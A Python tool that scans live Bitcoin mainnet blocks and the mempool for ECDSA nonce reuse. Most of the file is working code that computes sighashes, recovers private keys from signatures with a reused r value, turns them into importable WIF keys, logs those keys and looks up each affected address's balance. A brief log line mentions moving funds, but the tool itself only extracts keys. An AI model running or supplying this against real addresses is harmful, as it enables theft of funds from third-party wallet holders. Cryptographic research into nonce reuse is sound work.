#!/usr/bin/env python3
"""
Scan Bitcoin Mainnet blocks and mempool for ECDSA nonce reuse (r-value reuse)
vulnerabilities with FULL PRIVATE KEY RECOVERY.

Extracts DER-encoded signatures from P2PKH/P2WPKH/P2SH-P2WPKH inputs, computes
the sighash (z value) for each input, detects r-value reuse, and recovers the
private key when found.

Uses the mempool.space API (no authentication required).
"""

import argparse
import hashlib
import json
import logging
import struct
import sys
import time
from collections import defaultdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("btc_scan_results.log", mode="w"),
    ],
)
logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
# secp256k1 curve order
N_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
# secp256k1 field prime
FIELD_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F

SIGHASH_ALL = 0x01

MEMPOOL_API_ENDPOINTS = [
    "https://mempool.space/api",
    "https://mempool.emzy.de/api",
    "https://mempool.bisq.services/api",
]


# ---------------------------------------------------------------------------
# HTTP Session
# ---------------------------------------------------------------------------
def _build_session(timeout: int = 15, retries: int = 3) -> requests.Session:
    session = requests.Session()
    retry = Retry(
        total=retries,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.timeout = timeout
    return session


# ---------------------------------------------------------------------------
# API Client
# ---------------------------------------------------------------------------
class MempoolAPIClient:
    """Client for mempool.space REST API."""

    def __init__(self, base_url: Optional[str] = None, timeout: int = 15) -> None:
        self.base_url = (base_url or MEMPOOL_API_ENDPOINTS[0]).rstrip("/")
        self.timeout = timeout
        self.session = _build_session(timeout=timeout)
        self._rate_limit_delay = 0.25  # seconds between requests

    def _get(self, endpoint: str) -> Any:
        url = f"{self.base_url}{endpoint}"
        time.sleep(self._rate_limit_delay)
        resp = self.session.get(url, timeout=self.timeout)
        if resp.status_code == 429:
            logger.warning("Rate limited, waiting 10s...")
            time.sleep(10)
            resp = self.session.get(url, timeout=self.timeout)
        resp.raise_for_status()
        return resp.json()

    def _get_text(self, endpoint: str) -> str:
        url = f"{self.base_url}{endpoint}"
        time.sleep(self._rate_limit_delay)
        resp = self.session.get(url, timeout=self.timeout)
        resp.raise_for_status()
        return resp.text.strip()

    def get_tip_height(self) -> int:
        return int(self._get_text("/blocks/tip/height"))

    def get_block_hash(self, height: int) -> str:
        return self._get_text(f"/block-height/{height}")

    def get_block_txs(self, block_hash: str, start_index: int = 0) -> List[Dict]:
        return self._get(f"/block/{block_hash}/txs/{start_index}")

    def get_block_tx_count(self, block_hash: str) -> int:
        """Get number of transactions in a block."""
        block_info = self._get(f"/block/{block_hash}")
        return block_info.get("tx_count", 0)

    def get_mempool_recent(self) -> List[Dict]:
        return self._get("/mempool/recent")

    def get_mempool_txids(self) -> List[str]:
        return self._get("/mempool/txids")

    def get_transaction(self, txid: str) -> Dict:
        return self._get(f"/tx/{txid}")

    def get_address_info(self, address: str) -> Dict:
        return self._get(f"/address/{address}")

    def get_address_utxos(self, address: str) -> List[Dict]:
        return self._get(f"/address/{address}/utxo")

    def get_tx_hex(self, txid: str) -> str:
        """Get raw transaction hex."""
        return self._get_text(f"/tx/{txid}/hex")


# ---------------------------------------------------------------------------
# Sighash Computation
# ---------------------------------------------------------------------------
def sha256d(data: bytes) -> bytes:
    """Double SHA-256."""
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def hash160(data: bytes) -> bytes:
    """RIPEMD160(SHA256(data))."""
    sha = hashlib.sha256(data).digest()
    try:
        return hashlib.new("ripemd160", sha).digest()
    except (ValueError, TypeError):
        # OpenSSL 3.0+ may not support ripemd160; fall back to pycryptodome
        from Crypto.Hash import RIPEMD160
        return RIPEMD160.new(sha).digest()


def encode_varint(value: int) -> bytes:
    if value < 0xFD:
        return struct.pack("<B", value)
    if value <= 0xFFFF:
        return b"\xfd" + struct.pack("<H", value)
    if value <= 0xFFFFFFFF:
        return b"\xfe" + struct.pack("<I", value)
    return b"\xff" + struct.pack("<Q", value)


def legacy_sighash(tx: Dict, input_index: int, subscript_hex: str, sighash_type: int = SIGHASH_ALL) -> int:
    """Compute legacy (pre-segwit) sighash for a P2PKH input.

    Serializes the transaction with the subscript (prevout scriptPubKey) placed
    in the signing input and empty scripts for all other inputs, appends the
    4-byte sighash type, and double-SHA256s the result.

    Uses mempool.space tx format:
      vin[i].txid, vin[i].vout, vin[i].sequence, vin[i].prevout.scriptpubkey
      vout[i].scriptpubkey, vout[i].value (satoshis)
    """
    subscript = bytes.fromhex(subscript_hex)
    version = struct.pack("<I", tx.get("version", 1))

    vin_list = tx["vin"]
    serialized_inputs = bytearray(encode_varint(len(vin_list)))
    for idx, vin in enumerate(vin_list):
        prev_txid = bytes.fromhex(vin["txid"])[::-1]
        prev_vout = struct.pack("<I", vin["vout"])
        if idx == input_index:
            script = subscript
        else:
            script = b""
        script_len = encode_varint(len(script))
        sequence = struct.pack("<I", vin.get("sequence", 0xFFFFFFFF))
        serialized_inputs += prev_txid + prev_vout + script_len + script + sequence

    vout_list = tx["vout"]
    serialized_outputs = bytearray(encode_varint(len(vout_list)))
    for vout in vout_list:
        amount = struct.pack("<Q", vout["value"])
        script = bytes.fromhex(vout["scriptpubkey"])
        serialized_outputs += amount + encode_varint(len(script)) + script

    locktime = struct.pack("<I", tx.get("locktime", 0))
    hash_type = struct.pack("<I", sighash_type)

    preimage = version + bytes(serialized_inputs) + bytes(serialized_outputs) + locktime + hash_type
    digest = sha256d(preimage)
    return int.from_bytes(digest, "big")


def bip143_sighash(
    tx: Dict, input_index: int, script_code: bytes, amount_sat: int, sighash_type: int = SIGHASH_ALL
) -> int:
    """Compute BIP143 (segwit v0) sighash for P2WPKH or P2SH-P2WPKH inputs.

    Uses mempool.space tx format.
    """
    version = struct.pack("<I", tx.get("version", 1))

    # hashPrevouts
    prevouts = b"".join(
        bytes.fromhex(vin["txid"])[::-1] + struct.pack("<I", vin["vout"])
        for vin in tx["vin"]
    )
    hash_prevouts = sha256d(prevouts)

    # hashSequence
    sequences = b"".join(
        struct.pack("<I", vin.get("sequence", 0xFFFFFFFF)) for vin in tx["vin"]
    )
    hash_sequence = sha256d(sequences)

    # hashOutputs
    outputs = b"".join(
        struct.pack("<Q", vout["value"])
        + encode_varint(len(bytes.fromhex(vout["scriptpubkey"])))
        + bytes.fromhex(vout["scriptpubkey"])
        for vout in tx["vout"]
    )
    hash_outputs = sha256d(outputs)

    vin = tx["vin"][input_index]
    outpoint = bytes.fromhex(vin["txid"])[::-1] + struct.pack("<I", vin["vout"])
    script_code_serialized = encode_varint(len(script_code)) + script_code
    amount = struct.pack("<Q", amount_sat)
    sequence = struct.pack("<I", vin.get("sequence", 0xFFFFFFFF))
    locktime = struct.pack("<I", tx.get("locktime", 0))
    hash_type = struct.pack("<I", sighash_type)

    preimage = (
        version
        + hash_prevouts
        + hash_sequence
        + outpoint
        + script_code_serialized
        + amount
        + sequence
        + hash_outputs
        + locktime
        + hash_type
    )
    digest = sha256d(preimage)
    return int.from_bytes(digest, "big")


def build_p2wpkh_script_code(pubkey_hex: str) -> bytes:
    """Build the script code for P2WPKH BIP143 sighash: OP_DUP OP_HASH160 <hash> OP_EQUALVERIFY OP_CHECKSIG."""
    pubkey_bytes = bytes.fromhex(pubkey_hex)
    key_hash = hash160(pubkey_bytes)
    return b"\x76\xa9\x14" + key_hash + b"\x88\xac"


def compute_sighash_for_input(tx: Dict, vin_idx: int, pubkey_hex: Optional[str] = None) -> Optional[int]:
    """Compute the sighash (z value) for a transaction input.

    Handles P2PKH (legacy), P2WPKH (native segwit), and P2SH-P2WPKH (wrapped segwit).
    """
    vin = tx["vin"][vin_idx]
    prevout = vin.get("prevout", {})
    script_type = prevout.get("scriptpubkey_type", "")
    prevout_script = prevout.get("scriptpubkey", "")
    amount_sat = prevout.get("value", 0)

    try:
        if script_type == "p2pkh":
            # Legacy sighash: use the prevout scriptPubKey as subscript
            return legacy_sighash(tx, vin_idx, prevout_script, SIGHASH_ALL)

        elif script_type == "v0_p2wpkh":
            # Native SegWit P2WPKH: BIP143 sighash
            if not pubkey_hex:
                return None
            script_code = build_p2wpkh_script_code(pubkey_hex)
            return bip143_sighash(tx, vin_idx, script_code, amount_sat, SIGHASH_ALL)

        elif script_type == "p2sh":
            # Could be P2SH-P2WPKH (wrapped segwit)
            witness = vin.get("witness", [])
            if witness and pubkey_hex:
                # P2SH-P2WPKH: use BIP143 with the inner P2WPKH script code
                script_code = build_p2wpkh_script_code(pubkey_hex)
                return bip143_sighash(tx, vin_idx, script_code, amount_sat, SIGHASH_ALL)
            else:
                # Plain P2SH (multisig etc) — skip for now
                return None

        elif script_type == "v0_p2wsh":
            # P2WSH: would need the witness script, skip for now
            return None

    except Exception:
        return None

    return None


# ---------------------------------------------------------------------------
# Public Key / Address Utilities
# ---------------------------------------------------------------------------
def pubkey_to_p2pkh_address(pubkey_hex: str) -> str:
    """Convert a compressed/uncompressed public key to a P2PKH address."""
    pubkey_bytes = bytes.fromhex(pubkey_hex)
    key_hash = hash160(pubkey_bytes)
    versioned = b"\x00" + key_hash
    checksum = sha256d(versioned)[:4]
    import base58
    return base58.b58encode(versioned + checksum).decode()


def verify_recovered_key(private_key_int: int, pubkey_hex: str) -> bool:
    """Verify that a recovered private key corresponds to the expected public key."""
    try:
        from ecdsa import SECP256k1
        G = SECP256k1.generator
        point = private_key_int * G
        x = point.x()
        y = point.y()
        # Check compressed pubkey
        prefix = b"\x02" if y % 2 == 0 else b"\x03"
        computed_compressed = (prefix + x.to_bytes(32, "big")).hex()
        if computed_compressed == pubkey_hex:
            return True
        # Check uncompressed
        computed_uncompressed = (b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")).hex()
        if computed_uncompressed == pubkey_hex:
            return True
        return False
    except Exception:
        return False


# ---------------------------------------------------------------------------
# DER Signature Parsing
# ---------------------------------------------------------------------------
def parse_der_signature(sig_hex: str) -> Optional[Dict[str, Any]]:
    """Parse a DER-encoded ECDSA signature and extract r, s values.

    The last byte is the sighash type flag and is not part of the DER encoding.
    """
    try:
        if not sig_hex or len(sig_hex) < 14:
            return None

        offset = 0
        # SEQUENCE tag
        if sig_hex[offset:offset + 2] != "30":
            return None
        offset += 2

        total_length = int(sig_hex[offset:offset + 2], 16)
        offset += 2

        # INTEGER tag for r
        if sig_hex[offset:offset + 2] != "02":
            return None
        offset += 2

        r_length = int(sig_hex[offset:offset + 2], 16) * 2
        offset += 2
        r_hex = sig_hex[offset:offset + r_length]
        offset += r_length

        # INTEGER tag for s
        if sig_hex[offset:offset + 2] != "02":
            return None
        offset += 2

        s_length = int(sig_hex[offset:offset + 2], 16) * 2
        offset += 2
        s_hex = sig_hex[offset:offset + s_length]
        offset += s_length

        # Sighash type (last byte of the full signature including sighash)
        sighash = sig_hex[offset:offset + 2] if offset + 2 <= len(sig_hex) else "01"

        r_int = int(r_hex, 16)
        s_int = int(s_hex, 16)

        return {
            "r": r_hex,
            "s": s_hex,
            "r_int": r_int,
            "s_int": s_int,
            "sighash": sighash,
            "r_bits": r_int.bit_length(),
            "s_bits": s_int.bit_length(),
        }
    except (ValueError, IndexError):
        return None


def _read_pushdata(script_hex: str, offset: int) -> Tuple[Optional[str], int]:
    """Read a push-data element from a script hex string."""
    if offset + 2 > len(script_hex):
        return None, offset

    opcode = int(script_hex[offset:offset + 2], 16)
    offset += 2

    if opcode <= 75:
        data_len = opcode * 2
    elif opcode == 76:  # OP_PUSHDATA1
        if offset + 2 > len(script_hex):
            return None, offset
        data_len = int(script_hex[offset:offset + 2], 16) * 2
        offset += 2
    elif opcode == 77:  # OP_PUSHDATA2
        if offset + 4 > len(script_hex):
            return None, offset
        data_len = int.from_bytes(bytes.fromhex(script_hex[offset:offset + 4]), "little") * 2
        offset += 4
    else:
        return None, offset

    if offset + data_len > len(script_hex):
        return None, offset

    data = script_hex[offset:offset + data_len]
    return data, offset + data_len


def extract_signatures_from_scriptsig(scriptsig_hex: str) -> List[Dict[str, Any]]:
    """Extract DER signatures and pubkeys from a P2PKH scriptSig."""
    if not scriptsig_hex:
        return []

    signatures = []
    offset = 0
    elements = []

    while offset < len(scriptsig_hex):
        data, offset = _read_pushdata(scriptsig_hex, offset)
        if data is None:
            break
        elements.append(data)

    for element in elements:
        if len(element) >= 140 and element[:2] == "30":
            # Looks like a DER signature (with sighash byte)
            parsed = parse_der_signature(element)
            if parsed:
                # Find associated pubkey (next push of 33 or 65 bytes)
                pubkey = None
                for other in elements:
                    if len(other) in (66, 130) and other[:2] in ("02", "03", "04"):
                        pubkey = other
                        break
                parsed["pubkey"] = pubkey
                signatures.append(parsed)

    return signatures


def extract_signatures_from_witness(witness: List[str]) -> List[Dict[str, Any]]:
    """Extract DER signatures from witness data (P2WPKH/P2WSH)."""
    if not witness:
        return []

    signatures = []
    pubkey = None

    for item in witness:
        if len(item) in (66, 130) and item[:2] in ("02", "03", "04"):
            pubkey = item
        elif len(item) >= 140 and item[:2] == "30":
            parsed = parse_der_signature(item)
            if parsed:
                signatures.append(parsed)

    for sig in signatures:
        if pubkey and not sig.get("pubkey"):
            sig["pubkey"] = pubkey

    return signatures


# ---------------------------------------------------------------------------
# Transaction Signature Extraction (with sighash computation)
# ---------------------------------------------------------------------------
def extract_all_signatures(tx: Dict, compute_z: bool = True) -> List[Dict[str, Any]]:
    """Extract all ECDSA signatures from a transaction's inputs.

    When compute_z=True, also computes the sighash (z value) for each input,
    enabling full private key recovery when r-value reuse is detected.
    """
    results = []
    txid = tx.get("txid", "unknown")

    for vin_idx, vin in enumerate(tx.get("vin", [])):
        # Skip coinbase transactions
        if vin.get("is_coinbase"):
            continue

        prevout = vin.get("prevout", {})
        address = prevout.get("scriptpubkey_address", "")
        script_type = prevout.get("scriptpubkey_type", "")

        # P2PKH: signature is in scriptsig
        scriptsig = vin.get("scriptsig", "")
        sigs_from_script = extract_signatures_from_scriptsig(scriptsig)

        # P2WPKH/P2WSH: signature is in witness
        witness = vin.get("witness", [])
        sigs_from_witness = extract_signatures_from_witness(witness)

        all_sigs = sigs_from_script + sigs_from_witness

        for sig in all_sigs:
            sig["txid"] = txid
            sig["vin_index"] = vin_idx
            sig["address"] = address
            sig["script_type"] = script_type

            # Compute sighash (z value) for full recovery capability
            if compute_z:
                pubkey_hex = sig.get("pubkey")
                z = compute_sighash_for_input(tx, vin_idx, pubkey_hex)
                sig["z"] = z
            else:
                sig["z"] = None

            results.append(sig)

    return results


# ---------------------------------------------------------------------------
# R-value Reuse Detection
# ---------------------------------------------------------------------------
def find_r_reuse(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Find signatures with reused r values (same address)."""
    # Group by (address, r_hex)
    r_map: Dict[Tuple[str, str], List[Dict]] = defaultdict(list)
    for sig in signatures:
        addr = sig.get("address", "")
        r_hex = sig.get("r", "")
        if addr and r_hex:
            r_map[(addr, r_hex)].append(sig)

    findings = []
    for (address, r_hex), sigs in r_map.items():
        if len(sigs) >= 2:
            findings.append({
                "type": "r_value_reuse",
                "address": address,
                "r_value": r_hex,
                "r_int": sigs[0]["r_int"],
                "signature_count": len(sigs),
                "signatures": sigs,
                "risk": "CRITICAL",
                "private_key_recoverable": True,
            })

    return findings


def find_r_reuse_global(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Find r-value reuse across ALL signatures (even different addresses with same pubkey)."""
    # Group by (pubkey, r_hex) for cross-address detection
    r_map: Dict[Tuple[str, str], List[Dict]] = defaultdict(list)
    for sig in signatures:
        pubkey = sig.get("pubkey", "")
        r_hex = sig.get("r", "")
        if pubkey and r_hex:
            r_map[(pubkey, r_hex)].append(sig)

    findings = []
    for (pubkey, r_hex), sigs in r_map.items():
        if len(sigs) >= 2:
            addresses = list(set(s.get("address", "") for s in sigs))
            findings.append({
                "type": "r_value_reuse_global",
                "pubkey": pubkey,
                "addresses": addresses,
                "r_value": r_hex,
                "r_int": sigs[0]["r_int"],
                "signature_count": len(sigs),
                "signatures": sigs,
                "risk": "CRITICAL",
            })

    return findings


# ---------------------------------------------------------------------------
# Private Key Recovery
# ---------------------------------------------------------------------------
def recover_private_key(sig1: Dict, sig2: Dict) -> Optional[Dict[str, Any]]:
    """Recover private key from two signatures with the same r value.

    Given two signatures (r, s1, z1) and (r, s2, z2) with the same nonce k:
        k = (z1 - z2) / (s1 - s2) mod n
        d = (s1*k - z1) / r mod n

    Also tries the low-s variant: if one s was normalized to n-s, we try
    both (s1 - s2) and (s1 + s2) as denominators.
    """
    try:
        r = sig1["r_int"]
        s1, s2 = sig1["s_int"], sig2["s_int"]
        z1 = sig1.get("z")
        z2 = sig2.get("z")

        if z1 is None or z2 is None:
            return None
        if z1 == z2 and s1 == s2:
            return None  # identical signatures, no info gain

        pubkey_hex = sig1.get("pubkey") or sig2.get("pubkey")

        # Try multiple formulations to handle low-s normalization
        candidates = []

        for s2_trial in (s2, N_ORDER - s2):
            numerator = (z1 - z2) % N_ORDER
            denominator = (s1 - s2_trial) % N_ORDER
            if denominator == 0:
                continue

            k = (numerator * pow(denominator, -1, N_ORDER)) % N_ORDER
            r_inv = pow(r, -1, N_ORDER)

            # d = (s*k - z) / r mod n
            private_key = ((s1 * k - z1) * r_inv) % N_ORDER
            if 0 < private_key < N_ORDER:
                candidates.append((private_key, k))

            # Try with negated k
            k_neg = N_ORDER - k
            private_key2 = ((s1 * k_neg - z1) * r_inv) % N_ORDER
            if 0 < private_key2 < N_ORDER:
                candidates.append((private_key2, k_neg))

        # Verify each candidate against the pubkey
        for private_key, k in candidates:
            if pubkey_hex and verify_recovered_key(private_key, pubkey_hex):
                return {
                    "private_key_hex": hex(private_key)[2:].zfill(64),
                    "private_key_int": str(private_key),
                    "k_hex": hex(k)[2:].zfill(64),
                    "verified": True,
                }

        # If no pubkey to verify against, return first candidate with cross-check
        if not pubkey_hex and candidates:
            private_key, k = candidates[0]
            # Cross-verify: does d work for both signatures?
            check_z2 = (k * s2 - r * private_key) % N_ORDER
            # s2 = k^-1 * (z2 + r*d) => z2 = s2*k - r*d
            if check_z2 == z2 % N_ORDER:
                return {
                    "private_key_hex": hex(private_key)[2:].zfill(64),
                    "private_key_int": str(private_key),
                    "k_hex": hex(k)[2:].zfill(64),
                    "verified": False,
                }

        return None
    except (ValueError, ZeroDivisionError, TypeError):
        return None


def private_key_to_wif(private_key_hex: str, compressed: bool = True) -> str:
    """Convert private key hex to Wallet Import Format (WIF)."""
    try:
        import base58
    except ImportError:
        return "N/A (install base58)"

    extended = "80" + private_key_hex
    if compressed:
        extended += "01"
    hash1 = hashlib.sha256(bytes.fromhex(extended)).digest()
    hash2 = hashlib.sha256(hash1).digest()
    checksum = hash2[:4].hex()
    return base58.b58encode(bytes.fromhex(extended + checksum)).decode("utf-8")


# ---------------------------------------------------------------------------
# Scanning Functions
# ---------------------------------------------------------------------------
def scan_blocks(
    client: MempoolAPIClient,
    start_height: int,
    end_height: int,
    output_file: Optional[str] = None,
) -> Dict[str, Any]:
    """Scan a range of Bitcoin blocks for r-value reuse."""
    all_signatures: List[Dict[str, Any]] = []
    stats = {
        "blocks_scanned": 0,
        "transactions_processed": 0,
        "signatures_extracted": 0,
    }

    logger.info(f"Scanning blocks {start_height:,} to {end_height:,}...")

    for height in range(start_height, end_height + 1):
        try:
            block_hash = client.get_block_hash(height)
            tx_count = client.get_block_tx_count(block_hash)
            logger.info(f"  Block {height:,} ({block_hash[:16]}...) - {tx_count} txs")

            # Paginate through block transactions (25 per page)
            for page_start in range(0, tx_count, 25):
                txs = client.get_block_txs(block_hash, start_index=page_start)
                for tx in txs:
                    sigs = extract_all_signatures(tx)
                    all_signatures.extend(sigs)
                    stats["transactions_processed"] += 1
                    stats["signatures_extracted"] += len(sigs)

            stats["blocks_scanned"] += 1

        except requests.HTTPError as e:
            logger.warning(f"  Error fetching block {height}: {e}")
            continue
        except Exception as e:
            logger.warning(f"  Unexpected error at block {height}: {e}")
            continue

    # Analyze
    results = _analyze_and_report(all_signatures, stats, client, output_file)
    return results


def scan_mempool(
    client: MempoolAPIClient,
    max_txs: int = 200,
    output_file: Optional[str] = None,
) -> Dict[str, Any]:
    """Scan the Bitcoin mempool for r-value reuse."""
    all_signatures: List[Dict[str, Any]] = []
    stats = {
        "mempool_txs_scanned": 0,
        "signatures_extracted": 0,
    }

    logger.info(f"Scanning mempool (up to {max_txs} transactions)...")

    try:
        txids = client.get_mempool_txids()
        txids_to_scan = txids[:max_txs]
        logger.info(f"  Mempool has {len(txids):,} unconfirmed txs, scanning {len(txids_to_scan)}")
    except Exception as e:
        logger.error(f"Failed to get mempool txids: {e}")
        return {"error": str(e)}

    for i, txid in enumerate(txids_to_scan):
        if (i + 1) % 50 == 0:
            logger.info(f"  Progress: {i + 1}/{len(txids_to_scan)} mempool txs")
        try:
            tx = client.get_transaction(txid)
            sigs = extract_all_signatures(tx)
            all_signatures.extend(sigs)
            stats["mempool_txs_scanned"] += 1
            stats["signatures_extracted"] += len(sigs)
        except requests.HTTPError:
            continue
        except Exception:
            continue

    results = _analyze_and_report(all_signatures, stats, client, output_file)
    return results


def _analyze_and_report(
    all_signatures: List[Dict],
    stats: Dict,
    client: MempoolAPIClient,
    output_file: Optional[str],
) -> Dict[str, Any]:
    """Analyze collected signatures for r-value reuse and report findings."""
    logger.info(f"\nAnalyzing {len(all_signatures)} extracted signatures...")

    # Find r-value reuse per address
    r_reuse_findings = find_r_reuse(all_signatures)
    # Also check global (same pubkey across addresses)
    r_reuse_global = find_r_reuse_global(all_signatures)

    results: Dict[str, Any] = {
        "stats": stats,
        "r_reuse_by_address": [],
        "r_reuse_global": [],
        "low_r_signatures": [],
        "low_s_signatures": [],
    }

    # Report r-reuse findings
    for finding in r_reuse_findings:
        address = finding["address"]
        logger.critical(
            f"R-VALUE REUSE | {address} | "
            f"r={finding['r_value'][:20]}... | "
            f"{finding['signature_count']} signatures"
        )

        # Try to get balance
        try:
            addr_info = client.get_address_info(address)
            balance_sat = addr_info.get("chain_stats", {}).get("funded_txo_sum", 0) - \
                          addr_info.get("chain_stats", {}).get("spent_txo_sum", 0)
            finding["balance_btc"] = balance_sat / 1e8
        except Exception:
            finding["balance_btc"] = None

        # Attempt private key recovery using computed z values
        sigs = finding["signatures"]
        pk_recovered = False
        for i in range(len(sigs)):
            if pk_recovered:
                break
            for j in range(i + 1, len(sigs)):
                if sigs[i].get("z") and sigs[j].get("z"):
                    pk_data = recover_private_key(sigs[i], sigs[j])
                    if pk_data:
                        finding["private_key"] = pk_data
                        finding["wif"] = private_key_to_wif(pk_data["private_key_hex"])
                        verified = pk_data.get("verified", False)
                        logger.critical(
                            f"  PRIVATE KEY RECOVERED for {address}! "
                            f"(verified={verified}) WIF={finding['wif']}"
                        )
                        pk_recovered = True
                        break

        results["r_reuse_by_address"].append(finding)

    for finding in r_reuse_global:
        results["r_reuse_global"].append(finding)

    # Check for weak signatures (low bit-count r or s — potential bias)
    for sig in all_signatures:
        if sig.get("r_bits", 256) < 250:
            results["low_r_signatures"].append({
                "txid": sig.get("txid"),
                "address": sig.get("address"),
                "r_bits": sig["r_bits"],
                "r": sig["r"],
            })
        if sig.get("s_bits", 256) < 250:
            results["low_s_signatures"].append({
                "txid": sig.get("txid"),
                "address": sig.get("address"),
                "s_bits": sig["s_bits"],
                "s": sig["s"],
            })

    # Save results
    if output_file:
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        # Make JSON-serializable (remove non-serializable items)
        serializable = json.loads(json.dumps(results, default=str))
        with open(output_path, "w") as f:
            json.dump(serializable, f, indent=2)
        logger.info(f"Results saved to {output_file}")

    return results


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def get_working_api() -> str:
    """Test and return a working mempool.space API endpoint."""
    session = _build_session(timeout=10)
    for endpoint in MEMPOOL_API_ENDPOINTS:
        try:
            resp = session.get(f"{endpoint}/blocks/tip/height", timeout=10)
            if resp.status_code == 200 and int(resp.text.strip()) > 0:
                logger.info(f"Connected to {endpoint}")
                return endpoint
        except Exception as e:
            logger.debug(f"Failed {endpoint}: {e}")
            continue
    raise ConnectionError("No working mempool.space API endpoint found!")


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Scan Bitcoin blocks and mempool for ECDSA nonce/r-value reuse"
    )
    parser.add_argument(
        "--mode", choices=["blocks", "mempool", "both"], default="both",
        help="Scan mode: blocks, mempool, or both (default: both)"
    )
    parser.add_argument("--start-block", type=int, default=None)
    parser.add_argument("--end-block", type=int, default=None)
    parser.add_argument(
        "--blocks", type=int, default=3,
        help="Number of recent blocks to scan (default: 3)"
    )
    parser.add_argument(
        "--mempool-txs", type=int, default=200,
        help="Max mempool transactions to scan (default: 200)"
    )
    parser.add_argument("--output", type=str, default="btc_scan_results.json")
    parser.add_argument("--api", type=str, default=None, help="Custom mempool.space API URL")

    args = parser.parse_args()

    # Connect
    api_url = args.api or get_working_api()
    client = MempoolAPIClient(base_url=api_url)

    tip_height = client.get_tip_height()
    logger.info(f"Bitcoin tip height: {tip_height:,}")

    start_time = time.time()
    all_results: Dict[str, Any] = {"mode": args.mode, "tip_height": tip_height}

    # Scan blocks
    if args.mode in ("blocks", "both"):
        end_block = args.end_block or tip_height
        start_block = args.start_block or (end_block - args.blocks + 1)
        start_block = max(0, start_block)
        end_block = min(end_block, tip_height)

        block_results = scan_blocks(
            client, start_block, end_block, output_file=None
        )
        all_results["block_scan"] = block_results

    # Scan mempool
    if args.mode in ("mempool", "both"):
        mempool_results = scan_mempool(
            client, max_txs=args.mempool_txs, output_file=None
        )
        all_results["mempool_scan"] = mempool_results

    elapsed = time.time() - start_time

    # Save combined results
    if args.output:
        output_path = Path(args.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, "w") as f:
            json.dump(all_results, f, indent=2, default=str)
        logger.info(f"All results saved to {args.output}")

    # Summary
    logger.info("\n" + "=" * 70)
    logger.info("SCAN SUMMARY")
    logger.info(f"  Duration: {elapsed:.2f}s")
    logger.info(f"  Mode: {args.mode}")

    total_r_reuse = 0
    for key in ("block_scan", "mempool_scan"):
        if key in all_results and isinstance(all_results[key], dict):
            r_reuse = all_results[key].get("r_reuse_by_address", [])
            total_r_reuse += len(r_reuse)
            stats = all_results[key].get("stats", {})
            logger.info(f"  [{key}] stats: {stats}")

    if total_r_reuse > 0:
        logger.critical(f"  R-VALUE REUSE FOUND: {total_r_reuse} address(es) affected!")
        logger.critical("  Private keys may be recoverable. Affected users should move funds.")
    else:
        logger.info("  No r-value reuse detected in scanned data.")

    logger.info("=" * 70)
    return 2 if total_r_reuse > 0 else 0


if __name__ == "__main__":
    sys.exit(main())
